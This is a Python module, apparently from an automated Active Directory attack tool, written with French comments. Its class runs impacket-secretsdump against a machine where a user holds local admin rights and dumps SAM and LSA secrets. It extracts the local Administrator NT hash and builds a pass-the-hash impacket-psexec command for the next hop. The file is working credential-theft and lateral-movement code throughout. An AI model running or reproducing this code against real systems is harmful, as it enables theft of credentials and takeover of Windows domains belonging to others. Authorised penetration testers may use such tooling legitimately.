import subprocess
from dataclasses import dataclass

from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.node import Node
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError
from services.printing import print_check, print_done
from references.cred_store import enrich_creds


@dataclass
class AdminToStrategy(ExploitStrategy):
    """
    AdminTo — Droits administrateur local sur la machine cible.
    Dump les hashes SAM + secrets LSA via impacket-secretsdump.

    Direction BloodHound : User --AdminTo--> Machine
        edge.source_node = utilisateur avec droits admin local
        edge.goal_node   = machine cible à dumper
    """

    edge: Edge

    @property
    def attacker(self) -> Node:
        return self.edge.source_node  # compte avec droits admin local

    @property
    def target(self) -> Node:
        return self.edge.goal_node  # machine à dumper

    # ── Interface ExploitStrategy ─────────────────────────────────────────────

    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.ADMIN_TO

    def exploit(self, creds: dict) -> ExploitResult:
        creds = {**creds, "username": self.attacker.sam()}
        creds = enrich_creds(creds)
        print_check(
            f"AdminTo: {self.attacker.label} ──▶ dump SAM/LSA sur {self.target.label}"
        )
        return self._run_secretsdump(creds)

    # ── Technique ─────────────────────────────────────────────────────────────

    def _run_secretsdump(self, creds: dict) -> ExploitResult:
        dc_ip    = creds["dc_ip"]
        domain   = creds["domain"]
        username = creds["username"]
        secret   = creds.get("secret", "")
        hashes   = creds.get("hashes")

        target_machine = self.target.label

        if hashes:
            cmd = [
                "impacket-secretsdump",
                f"{domain}/{username}@{target_machine}",
                "-target-ip", dc_ip,
                "-hashes", hashes,
            ]
        else:
            cmd = [
                "impacket-secretsdump",
                f"{domain}/{username}:{secret}@{target_machine}",
                "-target-ip", dc_ip,
            ]

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            output = proc.stdout + proc.stderr
        except subprocess.TimeoutExpired:
            raise HopFailedError(self.edge, "secretsdump timeout (30s)")
        except FileNotFoundError:
            raise HopFailedError(self.edge, "impacket-secretsdump introuvable dans le PATH")

        # Format NTLM : user:RID:LMhash:NThash:::
        all_hashes = [
            line.strip()
            for line in output.splitlines()
            if ":::" in line and not line.startswith("[")
        ]

        if not all_hashes:
            raise HopFailedError(
                self.edge,
                f"secretsdump ran but aucun hash SAM/LSA trouvé — output:\n{output}"
            )

        # Hash le plus intéressant = compte Administrateur local
        admin_line = next(
            (h for h in all_hashes if h.upper().startswith("ADMINISTRATOR:")), None
        ) or all_hashes[0]

        nt_hash = admin_line.split(":")[3] if admin_line.count(":") >= 3 else ""

        print_done(
            f"AdminTo OK — {len(all_hashes)} hash(es) dumpé(s) sur {target_machine}, "
            f"Administrator NT hash: {nt_hash}"
        )

        return ExploitResult(
            technique="AdminTo (secretsdump SAM + LSA)",
            edge=self.edge,
            success=True,
            notes=(
                f"Admin local sur {target_machine} exploité\n"
                f"  Administrator hash : {admin_line}\n"
                f"  Total hashes       : {len(all_hashes)}"
            ),
            next_command=(
                f"impacket-psexec {domain}/Administrator@{target_machine} "
                f"-hashes :{nt_hash} -target-ip {dc_ip}"
            ),
            cleanup_command="# Aucun artefact persistant — dump SAM en lecture seule",
            gained_access=Credential(
                username="Administrator",
                password=None,
                nt_hash=nt_hash or None,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )